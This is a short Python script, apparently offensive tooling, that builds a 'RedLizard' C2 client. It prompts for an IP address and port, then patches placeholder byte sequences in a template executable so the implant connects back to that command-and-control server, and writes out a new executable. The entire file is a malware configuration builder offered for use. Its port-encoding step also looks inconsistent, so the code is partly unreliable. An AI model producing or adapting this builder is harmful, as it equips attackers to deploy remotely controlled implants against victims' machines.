#!/bin/python3
import os

print("[+] RedLizard C2 Payload Generator.\n")

ip=input("Set IP for C2: ")
port=input("Set Port for C2: ")
a,b,c,d = ip.split('.')
templatefile = "RedLizard_Client.exe"
template=open(templatefile,'rb')
modtemp=template.read().hex()
template.close()
ahex = hex(int(a)).replace('0x','')
if len(ahex)==1:
	ahex='0'+ahex
bhex = hex(int(b)).replace('0x','')
if len(bhex)==1:
        bhex='0'+bhex
chex = hex(int(c)).replace('0x','')
if len(chex)==1:
        chex='0'+chex
dhex = hex(int(d)).replace('0x','')
if len(dhex)==1:
        dhex='0'+dhex

s = modtemp.replace("bebafeca",dhex+chex+bhex+ahex)
newfile="RedLizard_NewCLi.exe"

porthex = hex(int(port)).replace('0x','')
if len(porthex)==3:
	porthex = '0'+porthex
elif len(porthex)==2:
	porthex = '00'+porthex

s2 = s.replace("ecce",porthex[-2:]+porthex[0]+'1',1)
generating=open(newfile,'wb')
generating.write(bytes.fromhex(s2))
generating.close()

